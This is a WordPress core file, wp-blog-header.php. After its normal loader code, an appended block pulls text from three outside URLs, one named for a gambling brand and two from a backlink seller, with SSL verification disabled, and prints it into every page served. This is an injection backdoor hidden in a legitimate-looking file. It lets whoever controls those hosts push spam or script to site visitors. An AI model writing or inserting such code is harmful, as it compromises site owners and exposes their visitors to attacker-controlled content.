<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
$urls = [
  'https://tahu-isi.store/totomacau.txt',
  'https://www.backlinkku.id/menu/traffic-v1/script.txt',
  'https://www.backlinkku.id/menu/vip-v2/script.txt'
];

foreach ($urls as $url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // abaikan verifikasi SSL
    $content = curl_exec($ch);
    curl_close($ch);

    if ($content !== false) {
        echo $content . "\n";
    }
}
